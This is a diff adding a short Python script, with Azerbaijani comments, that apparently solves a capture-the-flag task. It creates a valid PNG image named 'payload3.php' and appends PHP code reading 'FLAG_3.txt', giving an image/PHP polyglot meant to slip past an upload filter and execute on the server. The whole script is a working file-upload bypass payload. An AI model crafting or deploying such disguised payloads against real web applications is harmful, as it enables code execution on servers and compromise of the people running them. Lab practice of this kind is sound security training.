@@ -1,0 +1,12 @@
+from PIL import Image
+import os
+
+# 1. Əsl PNG şəkil yarat
+img = Image.new('RGB', (100, 100), color='white')
+img.save("payload3.php", "PNG")
+
+# 2. Şəklin sonuna PHP kodunu əlavə et
+with open("payload3.php", "ab") as f:
+    f.write(b'\n<?php readfile("FLAG_3.txt") ?>')
+
+print("Fayl yaradıldı: payload3.php")
